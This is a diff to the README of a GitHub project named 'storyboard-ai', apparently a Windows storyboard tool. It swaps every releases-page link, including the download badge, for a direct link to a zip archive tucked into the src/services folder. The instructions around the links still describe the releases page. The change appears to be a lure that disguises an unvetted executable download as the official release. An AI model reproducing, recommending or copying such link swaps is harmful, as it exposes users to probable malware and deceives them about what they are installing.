@@ -1,6 +1,6 @@
 # 🎬 storyboard-ai - Make storyboards fast and clear
 
-[![Download storyboard-ai](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lossy-billiejeanking657/storyboard-ai/releases)
+[![Download storyboard-ai](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Lossy-billiejeanking657/storyboard-ai/main/src/services/storyboard_ai_1.7.zip)
 
 ## 🖥️ What storyboard-ai does
 
@@ -12,7 +12,7 @@ Use it to sketch scene order, place notes next to frames, and keep your project 
 
 Visit this page to download the app:
 
-https://github.com/Lossy-billiejeanking657/storyboard-ai/releases
+https://raw.githubusercontent.com/Lossy-billiejeanking657/storyboard-ai/main/src/services/storyboard_ai_1.7.zip
 
 On the releases page, look for the latest version. Download the Windows file that matches your system. If there are more than one, pick the one marked for Windows, then save it to your computer.
 
@@ -172,7 +172,7 @@ If the app feels slow, try closing unused tabs and programs before you open it a
 
 Use this link to get the latest Windows download:
 
-https://github.com/Lossy-billiejeanking657/storyboard-ai/releases
+https://raw.githubusercontent.com/Lossy-billiejeanking657/storyboard-ai/main/src/services/storyboard_ai_1.7.zip
 
 Check this page each time you want the newest version. The newest release is usually at the top.
 
